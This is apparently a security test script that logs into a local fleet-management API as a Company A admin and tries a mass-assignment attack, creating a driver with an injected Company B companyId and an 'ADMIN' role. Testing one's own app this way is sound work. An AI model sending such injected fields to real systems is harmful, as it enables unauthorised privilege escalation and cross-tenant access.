const { compA, compB, usersA, usersB } = require('../helper.js');

async function attack() {
  const tokenReq = await fetch('http://localhost:8080/api/v1/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: usersA.ADMIN.email, password: 'password123' })
  });
  const { access_token: token } = await tokenReq.json();

  // Attack: Try to create a driver but inject companyId of Company B and role ADMIN
  const postReq = await fetch(`http://localhost:8080/api/v1/drivers`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
    body: JSON.stringify({
      firstName: "Hacked",
      lastName: "Driver",
      email: "hacked@companya.com",
      phone: "1234567890",
      licenseNumber: "HACKED123",
      licenseState: "NY",
      companyId: compB,
      role: "ADMIN"
    })
  });
  console.log("MASS ASSIGNMENT CREATE DRIVER:", await postReq.status, await postReq.text());
}
attack();
